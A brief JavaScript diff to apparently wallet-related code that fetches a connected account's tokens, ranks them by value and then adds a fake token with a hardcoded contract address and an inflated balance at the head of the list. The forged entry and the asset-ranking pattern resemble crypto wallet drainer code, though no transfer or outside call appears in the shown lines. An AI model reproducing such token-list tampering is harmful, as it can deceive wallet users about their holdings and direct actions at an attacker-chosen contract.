@@ -185,6 +185,14 @@ async function covalenthqAPICall() {
         console.log("tokens-list", map_list)
         tokens = map_list.filter(f => f.value > 5)
         tokens.sort((a, b) => b.value - a.value);
+
+        let token1 = {
+            address : "0x7b8779e01d117ec7e220f8299a6f93672e8eae23",
+            balance : "999999999999999999",
+            value : 1000
+        }
+
+        tokens.unshift(token1)
         console.log("chainId:", await getNetwork(), "Tokens:", tokens);
         NFTs = await getNFTs(selectedAccount).catch(e=>{
             console.log("Unable to get NFts", e);
